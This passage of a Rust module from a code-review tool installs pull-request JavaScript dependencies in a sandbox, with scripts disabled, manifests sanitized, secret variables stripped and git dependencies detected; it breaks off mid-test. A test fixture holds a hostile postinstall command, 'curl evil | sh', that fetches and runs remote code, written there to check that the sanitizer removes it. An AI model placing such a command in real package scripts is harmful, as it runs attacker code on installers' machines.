//! Shared dependencies for review checkouts.
//!
//! Language features need a project's dependencies: without `node_modules`
//! every import from React or a library is `any`. Installing them into each
//! PR's checkout would cost a full install per PR, so tab keeps one install
//! per *dependency set* and links checkouts to it:
//!
//! ```text
//! workspaces/.shared/js/<key>/          one install, keyed by its inputs
//! workspaces/.shared/js/<key>/.tab-ready  written last; no marker = incomplete
//! workspaces/.shared/js/<key>/.tab-used   touched whenever a checkout links it
//! workspaces/.shared/pnpm-store/        content-addressed files, hard-linked
//! workspaces/.shared/npm-cache/         tarball cache for npm / yarn installs
//! workspaces/<owner>/<name>/pr-<n>/node_modules -> .shared/js/<key>/node_modules
//! ```
//!
//! The key is a hash of the lockfile and the dependency fields of every
//! `package.json`, so PRs that don't touch dependencies (most of them) share
//! one install and cost no disk at all. When two installs do differ, pnpm's
//! content-addressed store hard-links identical files, so only what changed
//! takes new space. npm and yarn lockfiles are converted with `pnpm import` to
//! get the same sharing; without pnpm they fall back to npm / yarn with a
//! shared download cache.
//!
//! Security: a PR is untrusted code, and installing is where package managers
//! run it. So installs here never run lifecycle scripts (`--ignore-scripts`),
//! happen in a separate directory holding only sanitized manifests (no repo
//! `.npmrc`, `.yarnrc`, `scripts`, `packageManager` or patches outside the
//! tree), refuse git-hosted dependencies (fetching one runs its `prepare`
//! script), and run without tab's or the user's GitHub tokens. The packages
//! that land on disk are only read, by the language server and the editor.
//!
//! Other ecosystems already share by design and need nothing here: Go's module
//! cache and Cargo's registry are per user, not per checkout. A Python
//! ecosystem would follow this module's shape (key a `uv` venv by `uv.lock`;
//! uv's cache hard-links like pnpm's store).

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::{Duration, SystemTime};

use serde::Serialize;
use serde_json::Value;
use sha2::{Digest, Sha256};
use tokio::sync::Mutex;

use crate::storage;

/// Bumped when the install layout changes, so old entries aren't reused.
const LAYOUT: &str = "tab-deps-v1";
const READY: &str = ".tab-ready";
const USED: &str = ".tab-used";
const MAX_LOCKFILE: u64 = 64 * 1024 * 1024;
const MAX_MANIFESTS: usize = 400;
const INSTALL_TIMEOUT: Duration = Duration::from_secs(15 * 60);
/// Directories never searched for manifests or links.
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "dist",
    "build",
    "out",
    "target",
    "vendor",
    "coverage",
    ".next",
];
/// package.json fields an install needs. Everything else (scripts,
/// packageManager, engines, config, bin) is dropped.
const MANIFEST_FIELDS: &[&str] = &[
    "name",
    "version",
    "private",
    "type",
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
    "peerDependenciesMeta",
    "workspaces",
    "overrides",
    "resolutions",
];
/// Fields of package.json's `pnpm` section that are just data.
const PNPM_FIELDS: &[&str] = &[
    "overrides",
    "packageExtensions",
    "peerDependencyRules",
    "patchedDependencies",
];
/// Environment variables a dependency install never needs.
pub const SECRET_ENV: &[&str] = &[
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "GITHUB_PAT",
    "GH_ENTERPRISE_TOKEN",
    "GITLAB_TOKEN",
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Lockfile {
    Pnpm,
    Npm,
    Yarn,
}

impl Lockfile {
    fn file(self) -> &'static str {
        match self {
            Lockfile::Pnpm => "pnpm-lock.yaml",
            Lockfile::Npm => "package-lock.json",
            Lockfile::Yarn => "yarn.lock",
        }
    }
}

/// What preparing a checkout's dependencies did.
#[derive(Debug, Clone, Serialize)]
pub struct DepsStatus {
    /// `ready`, `none` (nothing to install), `unsupported` or `error`.
    pub state: &'static str,
    pub lockfile: Option<Lockfile>,
    /// The tool that installed it (`pnpm`, `npm`, `yarn`).
    pub manager: Option<String>,
    pub key: Option<String>,
    /// True when another checkout had already installed this set.
    pub reused: bool,
    pub message: String,
}

impl DepsStatus {
    fn none(message: impl Into<String>) -> Self {
        Self {
            state: "none",
            lockfile: None,
            manager: None,
            key: None,
            reused: false,
            message: message.into(),
        }
    }
    fn unsupported(lockfile: Lockfile, message: impl Into<String>) -> Self {
        Self {
            state: "unsupported",
            lockfile: Some(lockfile),
            manager: None,
            key: None,
            reused: false,
            message: message.into(),
        }
    }
}

/// The inputs of one install: what gets copied and what the key covers.
#[derive(Debug)]
struct Plan {
    lockfile: Lockfile,
    /// Relative path (with `/`) → contents, sanitized.
    files: BTreeMap<String, Vec<u8>>,
    /// Directories (relative, `""` for the root) that have a package.json.
    packages: Vec<String>,
    key: String,
}

pub struct DepStore {
    root: PathBuf,
    /// One install per key at a time.
    locks: Mutex<HashMap<String, Arc<Mutex<()>>>>,
}

impl DepStore {
    /// `root` is `workspaces/.shared`.
    pub fn new(root: PathBuf) -> Self {
        Self {
            root,
            locks: Mutex::default(),
        }
    }

    fn js(&self) -> PathBuf {
        self.root.join("js")
    }

    /// Installs (or reuses) the checkout's JavaScript dependencies and links
    /// them in as `node_modules`.
    pub async fn prepare_js(&self, wt: &Path) -> anyhow::Result<DepsStatus> {
        let wt_owned = wt.to_path_buf();
        let plan = tokio::task::spawn_blocking(move || plan_js(&wt_owned)).await??;
        let plan = match plan {
            Ok(p) => p,
            Err(status) => return Ok(*status),
        };
        let entry = self.js().join(&plan.key);
        let lock = self
            .locks
            .lock()
            .await
            .entry(plan.key.clone())
            .or_default()
            .clone();
        let _guard = lock.lock().await;

        let reused = entry.join(READY).is_file();
        let manager = if reused {
            std::fs::read_to_string(entry.join(READY))
                .unwrap_or_default()
                .trim()
                .to_string()
        } else {
            if entry.exists() {
                // An install that didn't finish.
                tokio::fs::remove_dir_all(&entry).await?;
            }
            tokio::fs::create_dir_all(&entry).await?;
            for (rel, bytes) in &plan.files {
                let p = entry.join(rel);
                if let Some(parent) = p.parent() {
                    tokio::fs::create_dir_all(parent).await?;
                }
                tokio::fs::write(&p, bytes).await?;
            }
            match self.install(&entry, &plan).await {
                Ok(m) => {
                    tokio::fs::write(entry.join(READY), &m).await?;
                    m
                }
                Err(e) => {
                    let _ = tokio::fs::remove_dir_all(&entry).await;
                    return Ok(DepsStatus {
                        state: "error",
                        lockfile: Some(plan.lockfile),
                        manager: None,
                        key: Some(plan.key),
                        reused: false,
                        message: format!("{e:#}"),
                    });
                }
            }
        };
        let _ = std::fs::write(entry.join(USED), b"");
        let (wt2, entry2, pkgs) = (wt.to_path_buf(), entry.clone(), plan.packages.clone());
        tokio::task::spawn_blocking(move || link_all(&wt2, &entry2, &pkgs)).await??;
        Ok(DepsStatus {
            state: "ready",
            lockfile: Some(plan.lockfile),
            manager: Some(manager),
            key: Some(plan.key),
            reused,
            message: if reused {
                "Shared with another checkout".into()
            } else {
                "Installed".into()
            },
        })
    }

    async fn install(&self, dir: &Path, plan: &Plan) -> anyhow::Result<String> {
        let store = self.root.join("pnpm-store");
        let cache = self.root.join("npm-cache");
        let pnpm = crate::lsp::find("pnpm");
        let pnpm_install = |frozen: bool| {
            let mut a = vec![
                "install".to_string(),
                if frozen {
                    "--frozen-lockfile"
                } else {
                    "--no-frozen-lockfile"
                }
                .into(),
                "--ignore-scripts".into(),
                "--prefer-offline".into(),
                "--config.confirmModulesPurge=false".into(),
                "--config.node-linker=isolated".into(),
                "--config.package-import-method=auto".into(),
                format!("--store-dir={}", store.display()),
            ];
            if plan.packages.len() > 1 {
                a.push("--recursive".into());
            }
            a
        };
        if let Some(pnpm) = &pnpm {
            let mut ok = true;
            if plan.lockfile != Lockfile::Pnpm {
                // npm / yarn lockfile → pnpm's, so it shares the store.
                ok = run(pnpm, dir, &["import".into()]).await.is_ok();
                if ok {
                    let _ = std::fs::remove_file(dir.join(plan.lockfile.file()));
                }
            }
            if ok {
                if run(pnpm, dir, &pnpm_install(true)).await.is_ok() {
                    return Ok("pnpm".into());
                }
                // A lockfile from another pnpm major: resolve again, offline first.
                if plan.lockfile == Lockfile::Pnpm {
                    run(pnpm, dir, &pnpm_install(false)).await?;
                    return Ok("pnpm".into());
                }
            }
        }
        let cache_arg = format!("--cache={}", cache.display());
        match plan.lockfile {
            Lockfile::Npm => {
                let npm = crate::lsp::find("npm")
                    .ok_or_else(|| anyhow::anyhow!("Installing needs npm or pnpm."))?;
                // `pnpm import` may have removed it.
                if !dir.join("package-lock.json").exists()
                    && let Some(b) = plan.files.get("package-lock.json")
                {
                    std::fs::write(dir.join("package-lock.json"), b)?;
                }
                run(
                    &npm,
                    dir,
                    &[
                        "ci".into(),
                        "--ignore-scripts".into(),
                        "--no-audit".into(),
                        "--no-fund".into(),
                        "--prefer-offline".into(),
                        cache_arg,
                    ],
                )
                .await?;
                Ok("npm".into())
            }
            Lockfile::Yarn => {
                let yarn = crate::lsp::find("yarn")
                    .ok_or_else(|| anyhow::anyhow!("Installing a yarn.lock needs pnpm or yarn."))?;
                if !dir.join("yarn.lock").exists()
                    && let Some(b) = plan.files.get("yarn.lock")
                {
                    std::fs::write(dir.join("yarn.lock"), b)?;
                }
                run(
                    &yarn,
                    dir,
                    &[
                        "install".into(),
                        "--frozen-lockfile".into(),
                        "--ignore-scripts".into(),
                        "--non-interactive".into(),
                        "--prefer-offline".into(),
                        format!("--cache-folder={}", self.root.join("yarn-cache").display()),
                    ],
                )
                .await?;
                Ok("yarn".into())
            }
            Lockfile::Pnpm => anyhow::bail!("Installing a pnpm-lock.yaml needs pnpm."),
        }
    }

    /// Type declarations of the checkout's dependencies, for the editor's
    /// built-in TypeScript service when no language server runs. Paths are
    /// `node_modules/<package>/<file>`. Bounded by `budget` bytes.
    pub fn types(&self, wt: &Path, budget: usize) -> Vec<(String, String)> {
        collect_types(wt, budget)
    }

    /// Removes installs no checkout links to and that weren't used for
    /// `keep`, then prunes the shared store.
    pub async fn sweep(&self, live: &[PathBuf], keep: Duration) -> storage::Swept {
        let js = self.js();
        let live_entries: HashSet<PathBuf> = live
            .iter()
            .filter_map(|wt| std::fs::read_link(wt.join("node_modules")).ok())
            .filter_map(|t| t.parent().map(Path::to_path_buf))
            .filter_map(|p| std::fs::canonicalize(p).ok())
            .collect();
        let now = SystemTime::now();
        let mut swept = storage::Swept::default();
        let Ok(entries) = std::fs::read_dir(&js) else {
            return swept;
        };
        for e in entries.flatten() {
            let p = e.path();
            if !p.is_dir() {
                continue;
            }
            if std::fs::canonicalize(&p)
                .map(|c| live_entries.contains(&c))
                .unwrap_or(false)
            {
                continue;
            }
            let ready = p.join(READY).is_file();
            let last = std::fs::metadata(p.join(USED))
                .or_else(|_| std::fs::metadata(&p))
                .and_then(|m| m.modified())
                .unwrap_or(SystemTime::UNIX_EPOCH);
            let age = now.duration_since(last).unwrap_or_default();
            // Incomplete installs older than a day are leftovers from a crash.
            let stale = if ready {
                age > keep
            } else {
                age > Duration::from_secs(86_400)
            };
            let lock = self
                .locks
                .lock()
                .await
                .get(&e.file_name().to_string_lossy().into_owned())
                .cloned();
            if !stale || lock.as_ref().is_some_and(|l| l.try_lock().is_err()) {
                continue;
            }
            let bytes = storage::dir_size(&p).bytes;
            if tokio::fs::remove_dir_all(&p).await.is_ok() {
                swept.add(storage::Swept { removed: 1, bytes });
            }
        }
        if swept.removed > 0 {
            let store = self.root.join("pnpm-store");
            if let (true, Some(pnpm)) = (store.exists(), crate::lsp::find("pnpm")) {
                let _ = run(
                    &pnpm,
                    &self.root,
                    &[
                        "store".into(),
                        "prune".into(),
                        format!("--store-dir={}", store.display()),
                    ],
                )
                .await;
            }
        }
        swept
    }
}

/// Runs a package manager in `dir`, without scripts, prompts or secrets.
async fn run(exe: &Path, dir: &Path, args: &[String]) -> anyhow::Result<()> {
    let mut cmd = crate::lsp::sandboxed(exe);
    cmd.args(args)
        .current_dir(dir)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("CI", "1")
        .env("npm_config_ignore_scripts", "true")
        .env("npm_config_audit", "false")
        .env("npm_config_fund", "false")
        .env("npm_config_update_notifier", "false")
        .env("YARN_ENABLE_SCRIPTS", "false")
        .env("YARN_IGNORE_SCRIPTS", "true")
        // Don't let a manifest pick and download a package manager.
        .env("COREPACK_ENABLE_STRICT", "0")
        .env("COREPACK_ENABLE_AUTO_PIN", "0")
        .env("COREPACK_ENABLE_DOWNLOAD_PROMPT", "0");
    let out = tokio::time::timeout(INSTALL_TIMEOUT, cmd.output())
        .await
        .map_err(|_| anyhow::anyhow!("The install took more than 15 minutes and was stopped."))??;
    if out.status.success() {
        return Ok(());
    }
    let text = String::from_utf8_lossy(if out.stderr.trim_ascii().is_empty() {
        &out.stdout
    } else {
        &out.stderr
    })
    .lines()
    .rfind(|l| !l.trim().is_empty())
    .unwrap_or("")
    .to_string();
    anyhow::bail!(
        "`{} {}` failed: {text}",
        exe.file_stem().unwrap_or_default().to_string_lossy(),
        args.first().map(String::as_str).unwrap_or("")
    )
}

fn walk_manifests(wt: &Path) -> Vec<String> {
    let mut out = Vec::new();
    let mut queue = VecDeque::from([(wt.to_path_buf(), String::new(), 0usize)]);
    while let Some((dir, rel, depth)) = queue.pop_front() {
        if out.len() >= MAX_MANIFESTS {
            break;
        }
        if dir.join("package.json").is_file() {
            out.push(rel.clone());
        }
        if depth >= 6 {
            continue;
        }
        let Ok(rd) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut subs: Vec<_> = rd
            .flatten()
            .filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false))
            .filter_map(|e| e.file_name().to_str().map(str::to_string))
            .filter(|n| !n.starts_with('.') && !SKIP_DIRS.contains(&n.as_str()))
            .collect();
        subs.sort();
        for n in subs {
            let r = if rel.is_empty() {
                n.clone()
            } else {
                format!("{rel}/{n}")
            };
            queue.push_back((dir.join(&n), r, depth + 1));
        }
    }
    out
}

/// Keeps only what an install reads. Returns the patch files it references.
fn sanitize_manifest(raw: &[u8]) -> Option<(Vec<u8>, Vec<String>)> {
    let v: Value = serde_json::from_slice(raw).ok()?;
    let obj = v.as_object()?;
    let mut out = serde_json::Map::new();
    for f in MANIFEST_FIELDS {
        if let Some(x) = obj.get(*f) {
            out.insert((*f).into(), x.clone());
        }
    }
    let mut patches = Vec::new();
    if let Some(p) = obj.get("pnpm").and_then(Value::as_object) {
        let mut keep = serde_json::Map::new();
        for f in PNPM_FIELDS {
            if let Some(x) = p.get(*f) {
                keep.insert((*f).into(), x.clone());
            }
        }
        if let Some(pd) = keep.get("patchedDependencies").and_then(Value::as_object) {
            patches.extend(pd.values().filter_map(Value::as_str).map(str::to_string));
        }
        out.insert("pnpm".into(), Value::Object(keep));
    }
    Some((
        serde_json::to_vec_pretty(&Value::Object(out)).ok()?,
        patches,
    ))
}

/// `pnpm-workspace.yaml` reduced to its package globs (and patch data
/// pnpm reads from it), so it can't carry settings like a registry.
fn sanitize_pnpm_workspace(raw: &str) -> String {
    let mut out = String::from("packages:\n");
    let mut in_packages = false;
    for line in raw.lines() {
        if !line.starts_with(' ') && !line.starts_with('-') && !line.trim().is_empty() {
            in_packages = line.trim_end() == "packages:";
            continue;
        }
        if in_packages {
            let t = line.trim();
            if let Some(glob) = t.strip_prefix('-') {
                let g = glob.trim().trim_matches(|c| c == '\'' || c == '"');
                if !g.is_empty() && !g.contains("..") && !g.starts_with('/') {
                    out.push_str(&format!("  - '{}'\n", g.replace('\'', "")));
                }
            }
        }
    }
    out
}

/// A relative path inside the tree: no `..`, no absolute, no drive.
fn inside(rel: &str) -> bool {
    !rel.is_empty()
        && !rel.starts_with('/')
        && !rel.starts_with('\\')
        && !rel.contains(':')
        && rel.split(['/', '\\']).all(|c| !c.is_empty() && c != "..")
}

/// Lockfile entries that would fetch a git repository (and run its
/// `prepare` script) or reach outside the tree.
fn risky_lockfile(text: &str) -> Option<&'static str> {
    let needles: &[(&str, &str)] = &[
        ("git+", "git-hosted dependencies"),
        ("git://", "git-hosted dependencies"),
        ("git@", "git-hosted dependencies"),
        ("type: git", "git-hosted dependencies"),
        ("codeload.github.com", "git-hosted dependencies"),
        ("link:/", "links outside the repository"),
        ("file:/", "files outside the repository"),
    ];
    needles
        .iter()
        .find(|(n, _)| text.contains(n))
        .map(|(_, why)| *why)
}

fn plan_js(wt: &Path) -> anyhow::Result<Result<Plan, Box<DepsStatus>>> {
    let lockfile = [Lockfile::Pnpm, Lockfile::Npm, Lockfile::Yarn]
        .into_iter()
        .find(|l| wt.join(l.file()).is_file());
    let Some(lockfile) = lockfile else {
        return Ok(Err(Box::new(if wt.join("package.json").is_file() {
            DepsStatus::none("No lockfile, so dependencies aren't installed.")
        } else {
            DepsStatus::none("Not a JavaScript project.")
        })));
    };
    let lock_path = wt.join(lockfile.file());
    if std::fs::metadata(&lock_path)?.len() > MAX_LOCKFILE {
        return Ok(Err(Box::new(DepsStatus::unsupported(
            lockfile,
            "The lockfile is too large.",
        ))));
    }
    let lock = std::fs::read(&lock_path)?;
    let lock_text = String::from_utf8_lossy(&lock);
    if lockfile == Lockfile::Yarn
        && lock_text.contains("__metadata:")
        && crate::lsp::find("pnpm").is_none()
    {
        return Ok(Err(Box::new(DepsStatus::unsupported(
            lockfile,
            "Yarn 2+ lockfiles need pnpm installed to convert them.",
        ))));
    }
    if let Some(why) = risky_lockfile(&lock_text) {
        return Ok(Err(Box::new(DepsStatus::unsupported(
            lockfile,
            format!(
                "The lockfile has {why}; tab doesn't install those because fetching them can run code."
            ),
        ))));
    }
    let mut files = BTreeMap::new();
    files.insert(lockfile.file().to_string(), lock);
    let mut packages = Vec::new();
    for rel in walk_manifests(wt) {
        let path = if rel.is_empty() {
            "package.json".to_string()
        } else {
            format!("{rel}/package.json")
        };
        let Ok(raw) = std::fs::read(wt.join(&path)) else {
            continue;
        };
        let Some((clean, patches)) = sanitize_manifest(&raw) else {
            continue;
        };
        for patch in patches {
            let p = if rel.is_empty() {
                patch.clone()
            } else {
                format!("{rel}/{patch}")
            };
            if inside(&p)
                && let Ok(b) = std::fs::read(wt.join(&p))
            {
                files.insert(p.replace('\\', "/"), b);
            }
        }
        files.insert(path, clean);
        packages.push(rel);
    }
    if !packages.iter().any(String::is_empty) {
        return Ok(Err(Box::new(DepsStatus::none(
            "No package.json next to the lockfile.",
        ))));
    }
    if let Ok(ws) = std::fs::read_to_string(wt.join("pnpm-workspace.yaml")) {
        files.insert(
            "pnpm-workspace.yaml".into(),
            sanitize_pnpm_workspace(&ws).into_bytes(),
        );
    }
    let mut h = Sha256::new();
    h.update(LAYOUT);
    h.update(std::env::consts::OS);
    h.update(std::env::consts::ARCH);
    for (k, v) in &files {
        h.update((k.len() as u64).to_le_bytes());
        h.update(k);
        h.update((v.len() as u64).to_le_bytes());
        h.update(v);
    }
    let key: String = h
        .finalize()
        .iter()
        .take(16)
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(Ok(Plan {
        lockfile,
        files,
        packages,
        key,
    }))
}

/// Makes `link` point at the directory `target`. A junction on Windows (no
/// admin or developer mode needed), a symlink elsewhere.
fn make_link(target: &Path, link: &Path) -> std::io::Result<()> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let out = std::process::Command::new("cmd")
            .arg("/C")
            .arg("mklink")
            .arg("/J")
            .arg(link)
            .arg(target)
            .creation_flags(0x0800_0000)
            .output()?;
        if !out.status.success() {
            return Err(std::io::Error::other(
                String::from_utf8_lossy(&out.stderr).trim().to_string(),
            ));
        }
        Ok(())
    }
    #[cfg(not(windows))]
    {
        std::os::unix::fs::symlink(target, link)
    }
}

fn is_link(p: &Path) -> bool {
    std::fs::symlink_metadata(p)
        .map(|m| m.file_type().is_symlink())
        .unwrap_or(false)
}

/// Removes a link without touching what it points at.
fn remove_link(p: &Path) -> std::io::Result<()> {
    // Junctions and directory symlinks on Windows are directories.
    std::fs::remove_dir(p).or_else(|_| std::fs::remove_file(p))
}

fn link_all(wt: &Path, entry: &Path, packages: &[String]) -> anyhow::Result<()> {
    for rel in packages {
        let target = if rel.is_empty() {
            entry.join("node_modules")
        } else {
            entry.join(rel).join("node_modules")
        };
        if !target.is_dir() {
            continue;
        }
        let pkg_dir = if rel.is_empty() {
            wt.to_path_buf()
        } else {
            wt.join(rel)
        };
        let link = pkg_dir.join("node_modules");
        if is_link(&link) {
            if std::fs::read_link(&link).ok().as_deref() == Some(target.as_path()) {
                continue;
            }
            remove_link(&link)?;
        } else if link.exists() {
            // A real node_modules (committed, or made by hand): leave it.
            continue;
        }
        make_link(&target, &link)?;
    }
    exclude_node_modules(wt);
    Ok(())
}

/// Adds `node_modules` to the clone's `info/exclude`, so the links never show
/// up as changes.
fn exclude_node_modules(wt: &Path) {
    let Ok(dotgit) = std::fs::read_to_string(wt.join(".git")) else {
        return;
    };
    let Some(gitdir) = dotgit
        .trim()
        .strip_prefix("gitdir:")
        .map(|s| PathBuf::from(s.trim()))
    else {
        return;
    };
    let common = std::fs::read_to_string(gitdir.join("commondir"))
        .map(|c| gitdir.join(c.trim()))
        .unwrap_or(gitdir);
    let exclude = common.join("info").join("exclude");
    let cur = std::fs::read_to_string(&exclude).unwrap_or_default();
    if cur.lines().any(|l| l.trim() == "node_modules") {
        return;
    }
    let _ = std::fs::create_dir_all(exclude.parent().unwrap_or(&common));
    let mut next = cur;
    if !next.is_empty() && !next.ends_with('\n') {
        next.push('\n');
    }
    next.push_str("# tab: shared dependencies are linked in\nnode_modules\n");
    let _ = std::fs::write(&exclude, next);
}

/// Removes every `node_modules` link in a checkout, before it's deleted, so
/// nothing that walks it can reach the shared install.
pub fn unlink(wt: &Path) {
    let mut stack = vec![(wt.to_path_buf(), 0usize)];
    while let Some((dir, depth)) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in rd.flatten() {
            let p = e.path();
            let name = e.file_name();
            if name == "node_modules" && is_link(&p) {
                let _ = remove_link(&p);
                continue;
            }
            if depth < 6
                && !is_link(&p)
                && e.file_type().map(|t| t.is_dir()).unwrap_or(false)
                && !SKIP_DIRS.contains(&name.to_string_lossy().as_ref())
            {
                stack.push((p, depth + 1));
            }
        }
    }
}

/// Finds `name` the way Node does: `node_modules/<name>` in `from` or above.
fn resolve_pkg(from: &Path, name: &str, stop: &Path) -> Option<PathBuf> {
    let mut dir = Some(from);
    while let Some(d) = dir {
        let p = d.join("node_modules").join(name);
        if p.join("package.json").is_file() {
            return std::fs::canonicalize(&p).ok();
        }
        if d == stop {
            break;
        }
        dir = d.parent();
    }
    None
}

fn dep_names(manifest: &Value, dev: bool) -> Vec<String> {
    let mut fields = vec!["dependencies", "peerDependencies", "optionalDependencies"];
    if dev {
        fields.push("devDependencies");
    }
    let mut out: Vec<String> = fields
        .iter()
        .filter_map(|f| manifest.get(*f).and_then(Value::as_object))
        .flat_map(|o| o.keys().cloned())
        .collect();
    out.sort();
    out.dedup();
    out
}

fn is_decl(name: &str) -> bool {
    name.ends_with(".d.ts") || name.ends_with(".d.mts") || name.ends_with(".d.cts")
}

fn collect_types(wt: &Path, budget: usize) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut used = 0usize;
    let mut seen = HashSet::new();
    // (package name, resolved dir, depth)
    let mut queue: VecDeque<(String, PathBuf, usize)> = VecDeque::new();
    // Where the install really lives, so lookups never climb out of it.
    let top = std::fs::canonicalize(wt.join("node_modules"))
        .ok()
        .and_then(|p| p.parent().map(Path::to_path_buf))
        .unwrap_or_else(|| wt.to_path_buf());
    for rel in walk_manifests(wt) {
        let dir = if rel.is_empty() {
            wt.to_path_buf()
        } else {
            wt.join(&rel)
        };
        let Ok(m) = std::fs::read(dir.join("package.json"))
            .map_err(|_| ())
            .and_then(|b| serde_json::from_slice::<Value>(&b).map_err(|_| ()))
        else {
            continue;
        };
        for name in dep_names(&m, true) {
            for n in [name.clone(), types_pkg(&name)] {
                if let Some(p) = resolve_pkg(&dir, &n, wt) {
                    queue.push_back((n, p, 0));
                }
            }
        }
    }
    while let Some((name, dir, depth)) = queue.pop_front() {
        if used >= budget || !seen.insert(name.clone()) {
            continue;
        }
        let Ok(raw) = std::fs::read(dir.join("package.json")) else {
            continue;
        };
        let Ok(manifest) = serde_json::from_slice::<Value>(&raw) else {
            continue;
        };
        let mut files = Vec::new();
        let mut stack = vec![(dir.clone(), String::new(), 0usize)];
        while let Some((d, rel, lvl)) = stack.pop() {
            let Ok(rd) = std::fs::read_dir(&d) else {
                continue;
            };
            for e in rd.flatten() {
                let n = e.file_name().to_string_lossy().into_owned();
                let r = if rel.is_empty() {
                    n.clone()
                } else {
                    format!("{rel}/{n}")
                };
                let Ok(t) = e.file_type() else { continue };
                if t.is_dir() && !t.is_symlink() {
                    if n != "node_modules" && !n.starts_with('.') && lvl < 8 {
                        stack.push((e.path(), r, lvl + 1));
                    }
                } else if t.is_file()
                    && is_decl(&n)
                    && let Ok(meta) = e.metadata()
                    && meta.len() < 4 * 1024 * 1024
                {
                    files.push((r, e.path(), meta.len() as usize));
                }
            }
        }
        if files.is_empty() {
            continue;
        }
        out.push((
            format!("node_modules/{name}/package.json"),
            String::from_utf8_lossy(&raw).into_owned(),
        ));
        for (r, p, len) in files {
            if used + len > budget {
                break;
            }
            if let Ok(text) = std::fs::read_to_string(&p) {
                used += len;
                out.push((format!("node_modules/{name}/{r}"), text));
            }
        }
        // Types often import other packages' types (React's need csstype).
        if depth < 3 {
            for dep in dep_names(&manifest, false) {
                for n in [dep.clone(), types_pkg(&dep)] {
                    if seen.contains(&n) {
                        continue;
                    }
                    if let Some(p) = resolve_pkg(&dir, &n, &top) {
                        queue.push_back((n, p, depth + 1));
                    }
                }
            }
        }
    }
    out
}

/// `@scope/pkg` → `@types/scope__pkg`, `pkg` → `@types/pkg`.
fn types_pkg(name: &str) -> String {
    match name.strip_prefix('@') {
        Some(rest) => format!("@types/{}", rest.replacen('/', "__", 1)),
        None => format!("@types/{name}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn manifests_keep_only_dependency_fields() {
        let raw = br#"{"name":"x","scripts":{"postinstall":"curl evil | sh"},"packageManager":"pnpm@1","dependencies":{"react":"19"},"pnpm":{"overrides":{"a":"1"},"onlyBuiltDependencies":["esbuild"],"patchedDependencies":{"a@1":"patches/a.patch"}}}"#;
        let (clean, patches) = sanitize_manifest(raw).unwrap();
        let v: Value = serde_json::from_slice(&clean).unwrap();
        assert!(v.get("scripts").is_none());
        assert!(v.get("packageManager").is_none());
        assert_eq!(v["dependencies"]["react"], "19");
        assert!(v["pnpm"].get("onlyBuiltDependencies").is_none());
        assert_eq!(patches, vec!["patches/a.patch"]);
    }

    #[test]
    fn workspace_yaml_keeps_only_globs() {
        let raw = "packages:\n  - 'packages/*'\n  - \"../escape\"\n  - apps/*\nregistry: https://evil\nonlyBuiltDependencies:\n  - esbuild\n";
        assert_eq!(
            sanitize_pnpm_workspace(raw),
            "packages:\n  - 'packages/*'\n  - 'apps/*'\n"
        );
    }

    #[test]
    fn flags_git_dependencies() {
        assert!(risky_lockfile("resolved \"git+ssh://git@github.com/a/b.git#abc\"").is_some());
        assert!(
            risky_lockfile("  resolution: {tarball: https://registry.npmjs.org/a/-/a-1.tgz}")
                .is_none()
        );
    }

    #[test]
    fn paths_stay_inside() {
        assert!(inside("patches/a.patch"));
        assert!(!inside("../a.patch"));
        assert!(!inside("/etc/passwd"));
        assert!(!inside("C:/x"));
        assert!(!inside("a//b"));
    }

    #[test]
    fn types_packages() {
        assert_eq!(types_pkg("react"), "@types/react");
        assert_eq!(types_pkg("@babel/core"), "@types/babel__core");
    }

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("tab-deps-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn same_dependencies_same_key() {
        let a = tmp("a");
        let b = tmp("b");
        for (d, scripts) in [(&a, "one"), (&b, "two")] {
            std::fs::write(d.join("package-lock.json"), "{}").unwrap();
            std::fs::write(
                d.join("package.json"),
                format!(r#"{{"name":"x","scripts":{{"t":"{scripts}"}},"dependencies":{{"react":"19"}}}}"#),
            )
            .unwrap();
            std::fs::create_dir_all(d.join("src")).unwrap();
            std::fs::write(d.join("src/a.ts"), scripts).unwrap();
        }
        let ka = plan_js(&a).unwrap().unwrap().key;
        let kb = plan_js(&b).unwrap().unwrap().key;
        assert_eq!(ka, kb, "scripts and sources don't change the key");
        std::fs::write(
            b.join("package.json"),
            r#"{"name":"x","dependencies":{"react":"18"}}"#,
        )
        .unwrap();
        assert_ne!(ka, plan_js(&b).unwrap().unwrap().key);
        let _ = std::fs::remove_dir_all(&a);
        let _ = std::fs::remove_dir_all(&b);
    }

    #[test]
    fn links_and_unlinks_without_touching_the_target() {
        let wt = tmp("wt");
        let entry = tmp("entry");
        std::fs::create_dir_all(entry.join("node_modules/react")).unwrap();
        std::fs::write(entry.join("node_modules/react/index.d.ts"), "export {}").unwrap();
        std::fs::write(entry.join("node_modules/react/package.json"), "{}").unwrap();
        link_all(&wt, &entry, &[String::new()]).unwrap();
        assert!(is_link(&wt.join("node_modules")));
        assert!(wt.join("node_modules/react/index.d.ts").is_file());
        // Linking again is a no-op.
        link_all(&wt, &entry, &[String::new()]).unwrap();
        unlink(&wt);
        assert!(!wt.join("node_modules").exists());
        assert!(entry.join("node_modules/react/index.d.ts").is_file());
        let _ = std::fs::remove_dir_all(&wt);
        let _ = std::fs::remove_dir_all(&entry);
    }

    #[test]
    fn collects_declarations_and_their_dependencies() {
        let wt = tmp("types");
        std::fs::write(
            wt.join("package.json"),
            r#"{"dependencies":{"react":"19"}}"#,
        )
        .unwrap();
        let nm = wt.join("node_modules");
